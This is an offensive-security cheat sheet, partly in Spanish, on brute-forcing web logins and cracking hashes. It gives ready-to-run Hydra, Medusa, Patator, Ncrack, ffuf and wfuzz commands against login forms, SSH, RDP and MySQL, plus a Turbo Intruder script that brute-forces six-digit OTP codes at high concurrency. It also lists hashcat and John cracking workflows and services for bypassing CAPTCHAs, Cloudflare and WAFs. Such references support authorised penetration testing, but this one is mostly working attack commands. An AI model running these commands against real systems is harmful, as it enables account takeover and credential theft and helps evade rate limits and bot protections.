---
aliases:
  - Hydra
  - Medusa
  - Patator
  - Burp Intruder
  - hashcat
tags:
  - type/cheatsheet
  - vuln/brute-force
  - technique/credential-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[HTTP Brute Forcing]]"
  - "[[Burp Suite]]"
  - "[[ffuf]]"
---
# HTTP Brute Forcing - Tooling

***

## Hydra (THC-Hydra)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| HTTP form POST | `hydra -L u.txt -P p.txt target http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"` | Multi-protocol. |
| HTTPS form POST | `hydra -L u.txt -P p.txt -s 443 target https-post-form ...` | Same con TLS. |
| HTTP GET form | `hydra ... http-get-form ...` | URL params. |
| HTTP Basic | `hydra -L u.txt -P p.txt target http-get /admin` | Basic auth. |
| Cookie required | `:H=Cookie\: session=XYZ` | Pre-fetch session. |
| CSRF token (basic) | `:H=Cookie\:...:H=X-CSRF\:TOKEN` | Static token. |
| Multiple threads | `-t 16` | Concurrent. |
| Stop on first | `-f` | Stop al success. |
| Verbose output | `-V` | Show each attempt. |
| Continue on success | `-F` (no stop) | Multi-account brute. |
| SSL verification skip | `-S` | Self-signed targets. |
| Output to file | `-o results.txt` | Reportable. |
| Single user + password | `-l admin -p Password123` | Test single. |
| Username = password | `-e ns` | Try empty + same as user. |
| Try login as username | `-e nsr` | All combos. |
| Reverse brute | `-L users.txt -p Password2025` | 1 pass × N users. |
^bf-tool-hydra

### Hydra HTTP form template

```bash
# Generic web form
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
  -t 16 -V -f \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid credentials"

# WordPress
hydra -l admin -P passwords.txt \
  target.com http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect"

# Form con CSRF token (semi-static cookie)
TOKEN=$(curl -s https://target/login | grep -oP 'csrf"\s*value="\K[^"]+')
hydra -l admin -P passwords.txt \
  target.com https-post-form \
  "/login:user=^USER^&pass=^PASS^&csrf=$TOKEN:H=Cookie\: PHPSESSID=$SESS:F=Invalid"
```

___

## Burp Suite Intruder + Turbo Intruder

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Sniper attack | Single payload position | Standard. |
| Battering Ram | Same payload all positions | Edge use. |
| Pitchfork | Parallel positions, paired payloads | User+pass paired. |
| Cluster Bomb | All combos all positions | User × pass cartesian. |
| Payload type Simple list | Wordlist file | Standard. |
| Payload type Numbers | Sequential brute | OTP/PIN. |
| Payload type Brute forcer | Char generation | Custom space. |
| Payload encoding Base64 | Auto-encode | Basic auth combo. |
| Grep Match | Find "success" string | Filter results. |
| Grep Extract | Extract token from response | Multi-step. |
| Status code filter | 200 vs 401 differential | Standard. |
| Length filter | Diff response size | Indicator. |
| Time filter | Unusual response times | Timing oracle. |
| Resource pool | Concurrent requests | Performance. |
| Throttle ms | Pacing | Anti-rate-limit. |
| Save attack | Save state for resume | Long attacks. |
| Turbo Intruder | Custom Python scripts | High-speed parallel. |
| Turbo race-single-packet | Single-packet attack | Race-based. |
^bf-tool-burp

### Turbo Intruder script (race OTP)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=100,
        requestsPerConnection=100,
        pipeline=False
    )
    for code in range(1000000):
        engine.queue(target.req, "%06d" % code)

def handleResponse(req, interesting):
    if "success" in req.response or req.status == 302:
        table.add(req)
```

___

## Medusa, Patator, Ncrack

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Medusa basic | `medusa -h target -U u.txt -P p.txt -M http -m DIR:/admin` | Modular. |
| Medusa form-based | `medusa -h target -U u.txt -P p.txt -M web-form -m FORM:"login.php" -m DENY-SIGNAL:"Invalid"` | Form support. |
| Patator HTTP fuzz | `patator http_fuzz url=https://target/login method=POST body='user=FILE0&pass=FILE1' 0=u.txt 1=p.txt -x ignore:fgrep="Invalid"` | Most flexible. |
| Patator SSH | `patator ssh_login host=target user=FILE0 password=FILE1 0=u.txt 1=p.txt` | SSH brute. |
| Patator MySQL | `patator mysql_login host=target user=root password=FILE0 0=p.txt` | DB brute. |
| Ncrack RDP | `ncrack -vv --user admin -P p.txt rdp://target` | RDP focus. |
| Ncrack SSH | `ncrack -vv --user root -P p.txt ssh://target` | Adjacent. |
| THC-IPv6 brute | IPv6-specific tools | Edge. |
| Wfuzz | `wfuzz -c -z file,p.txt -d "user=admin&pass=FUZZ" --hh SIZE https://target/login` | Curl-based. |
| ffuf POST | `ffuf -u https://target/login -X POST -d "user=admin&pass=FUZZ" -w p.txt -fs SIZE` | Modern fast. |
| BruteX | `brutex target` (auto-discover services) | All-in-one. |
| Crowbar (RDP focus) | `crowbar -b rdp -u admin -C p.txt -s target/32` | RDP-only. |
| BlackArch toolset | Various brute forcers | Distro. |
| Onex multi-tool | Wrapper | Convenience. |
| Sparta GUI | Visual brute | Old-school. |
| Custom Python `requests` | DIY | Maximum flex. |
^bf-tool-others

### Patator HTTP fuzz example

```bash
# CSRF-protected form with body fuzz
patator http_fuzz \
  url='https://target/login' \
  method=POST \
  body='username=admin&password=FILE0&csrf=TOKEN' \
  0=passwords.txt \
  -x ignore:fgrep='Invalid credentials' \
  -x ignore:code=429 \
  --threads=10
```

___

## ffuf, wfuzz, gobuster (Fast Fuzzers)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| ffuf POST body fuzz | `ffuf -u target/login -X POST -d 'user=admin&pass=FUZZ' -w pass.txt` | Fast. |
| ffuf filter status | `-fs 1234` (size) `-fc 401` (code) | Filtering. |
| ffuf match status | `-mc 200,302` | Show only success. |
| ffuf POST JSON | `-d '{"user":"admin","pass":"FUZZ"}' -H 'Content-Type: application/json'` | API. |
| ffuf headers fuzz | `-H 'X-Forwarded-For: FUZZ' -w ips.txt` | Header fuzz. |
| ffuf rate limit | `-rate 10` | Pacing. |
| ffuf cluster bomb | Multiple FUZZ keywords | Multi-payload. |
| ffuf delay | `-p 0.1-0.5` (random delay) | Timing. |
| ffuf extension | `-e .php,.html` | Path discovery combo. |
| ffuf recursion | `-recursion -recursion-depth 3` | Adjacent recon. |
| wfuzz curl-based | `wfuzz -c -z file,p.txt --hh SIZE -d 'user=a&pass=FUZZ' target/login` | Curl wrapper. |
| wfuzz multi-payload | `-z file,u.txt -z file,p.txt` | Cartesian. |
| gobuster (mostly path discovery) | Adjacent — not for login brute | Recon only. |
| dirsearch | Path discovery | Recon only. |
| feroxbuster | Path discovery | Recon only. |
| Katana JS analysis | Crawl + endpoint extract | Adjacent recon. |
^bf-tool-ffuf

### ffuf JSON API brute

```bash
ffuf -u https://target/api/v1/login \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"FUZZ"}' \
  -w /usr/share/wordlists/rockyou.txt \
  -fc 401 \
  -mc 200 \
  -t 10 \
  -rate 5 \
  -o results.json
```

___

## Hashcat / John (Hash Crack)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Hashcat MD5 | `hashcat -m 0 -a 0 hash.txt rockyou.txt` | GPU. |
| Hashcat SHA1 | `hashcat -m 100 hash.txt rockyou.txt` | Standard. |
| Hashcat SHA256 | `hashcat -m 1400 hash.txt rockyou.txt` | Standard. |
| Hashcat NTLM | `hashcat -m 1000 hash.txt rockyou.txt` | Windows. |
| Hashcat NetNTLMv2 | `hashcat -m 5600 hash.txt rockyou.txt` | Responder combo. |
| Hashcat bcrypt | `hashcat -m 3200 hash.txt rockyou.txt` | Slow. |
| Hashcat scrypt | `hashcat -m 8900 hash.txt rockyou.txt` | Slow. |
| Hashcat JWT HS256 | `hashcat -m 16500 jwt.txt rockyou.txt` | OAuth combo. |
| Hashcat WPA-PMKID | `hashcat -m 22000 hash.txt rockyou.txt` | WiFi. |
| Hashcat mask attack | `-a 3 -1 ?l?u?d ?1?1?1?1?1?1` | Pattern brute. |
| Hashcat rule | `-r rules/best64.rule` | Mangling. |
| Hashcat resume | `--restore` | Long attacks. |
| John MD5 | `john --format=raw-md5 hash.txt` | CPU. |
| John SSH key | `ssh2john id_rsa > sshkey.john; john sshkey.john` | SSH key. |
| John ZIP | `zip2john file.zip > zip.john; john zip.john` | ZIP password. |
| John PDF | `pdf2john file.pdf > pdf.john; john pdf.john` | PDF password. |
^bf-tool-hashcrack

### Hashcat workflow

```bash
# Check format type
hashid '$2b$12$...'  # → bcrypt

# Identify mode
# bcrypt = -m 3200

# Run with rules
hashcat -m 3200 -a 0 hashes.txt rockyou.txt -r rules/best64.rule

# Show cracked
hashcat -m 3200 hashes.txt --show

# Resume interrupted attack
hashcat --restore
```

___

## Wordlists & Anti-Captcha

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| RockYou | `/usr/share/wordlists/rockyou.txt` | Default Kali. |
| SecLists Passwords | `seclists/Passwords/` | Curated. |
| HIBP NTLM hashes | `haveibeenpwned.com/Passwords` | 800M+. |
| weakpass.com | Multiple GB lists | Mega-aggregate. |
| 2captcha API | `2captcha.com` $0.50/1000 | reCAPTCHA bypass. |
| anti-captcha.com | Same | Alt provider. |
| CapMonster | Self-hosted | $$ but private. |
| BotsBrokers | hCaptcha solver | Specialized. |
| Cloudflare bypass-cf | `flaresolverr` Docker | CF challenge solve. |
| FlareSolverr | `docker run flaresolverr/flaresolverr` | CF passive. |
| `cloudscraper` Python | Library para CF passive | DIY. |
| Headless Chrome (Puppeteer/Playwright) | Render + solve | JS challenge. |
| undetected-chromedriver | Anti-detection variant | Selenium evolved. |
| `curl-impersonate` | TLS fingerprint mimic | Anti-WAF. |
| `tls-client` Go lib | Same | Programmatic. |
| BrightData unlocker | Premium proxy + solver | $$$. |
^bf-tool-wordlists

***
